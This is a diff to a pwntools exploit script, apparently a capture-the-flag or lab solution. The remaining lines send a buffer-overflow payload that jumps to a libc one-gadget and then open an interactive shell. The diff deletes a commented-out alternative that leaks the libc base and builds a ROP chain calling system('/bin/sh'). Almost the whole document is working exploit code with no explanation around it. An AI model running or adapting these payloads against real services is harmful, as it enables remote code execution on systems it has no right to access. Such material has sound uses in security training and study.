@@ -53,26 +53,4 @@ payload = padding
 payload += p64(libc.address + oneshot[2])
 p.sendafter("> ", payload)
 
-"""
-p.recvn(0x40)
-libc.address = u64(p.recvn(8)) - 0x3f20ca # Offset
-log.critical(f"libc.address: {hex(libc.address)}")
-p.recvn(0xc0 - 0x48)
-
-rdi = libc.address + 0x00000000000215bf
-binsh = libc.search(b"/bin/sh\x00").__next__()
-system = libc.sym['system']
-
-log.info(f"libc.address: {hex(libc.address)}")
-log.info(f"gadget: {hex(rdi)}")
-log.info(f"/bin/sh: {hex(binsh)}")
-log.info(f"system: {hex(system)}")
-
-payload = padding
-payload += p64(rdi)
-payload += p64(binsh)
-payload += p64(system)
-
-p.sendafter("> ", payload)
-"""
 p.interactive()
